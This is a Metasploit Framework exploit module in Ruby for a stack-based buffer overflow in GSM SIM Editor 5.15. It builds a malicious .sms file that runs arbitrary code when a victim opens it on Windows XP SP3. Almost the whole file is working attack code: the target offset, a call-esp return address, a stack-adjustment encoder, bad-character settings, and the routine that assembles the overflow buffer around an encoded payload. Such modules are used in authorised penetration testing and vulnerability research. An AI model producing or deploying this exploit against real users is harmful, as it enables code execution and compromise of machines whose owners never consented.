# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
     
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;            => &#039;GSM SIM Editor 5.15 Buffer Overflow&#039;,
            &#039;Description&#039;     => %q{
                    This module exploits a stack-based buffer overflow in GSM SIM Editor 5.15.
                When opening a specially crafted .sms file in GSM SIM Editor a stack-based buffer
                overflow occurs which allows an attacker to execute arbitrary code.
            },
            &#039;License&#039;         => MSF_LICENSE,
            &#039;Author&#039;          =>
                [
                    &#039;Ruben Alejandro&#039;,
                    &#039;chap0 <contact.chap0[at]gmail.com>&#039;,
                    &#039;Lincoln <lincoln[at]corelan.be>&#039;
                ],
            &#039;References&#039;      =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/14258/&#039; ]
                ],
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => &#039;process&#039;,
                },
            &#039;Platform&#039;        => &#039;win&#039;,
            &#039;Payload&#039;         =>
                {
                    &#039;Space&#039; => 2000,
                    &#039;BadChars&#039; => "\x00",
                    &#039;DisableNops&#039; => true,
                    &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff", # Stack adjustment #add esp, -3500
                },
            &#039;Targets&#039;         =>
                [
                    [ &#039;Windows XP SP3&#039;,
                        {
                            &#039;Ret&#039;    => 0x00405201, # call esp - SIMEditor.exe
                            &#039;Offset&#039; => 810
                        }
                    ]
                ],
            &#039;Privileged&#039;      => false,
            &#039;DisclosureDate&#039;  => &#039;Jul 07 2010&#039;,
            &#039;DefaultTarget&#039;   => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;, &#039;msf.sms&#039;]),
            ], self.class)
 
    end
 
    def exploit
        buffer =  rand_text_numeric(target[&#039;Offset&#039;])
        buffer << [target.ret].pack(&#039;V&#039;).unpack("H*")[0]
        buffer << make_nops(30).unpack("H*")[0]
        buffer << payload.encoded.unpack("H*")[0]
 
        file_create(buffer)
    end
 
end



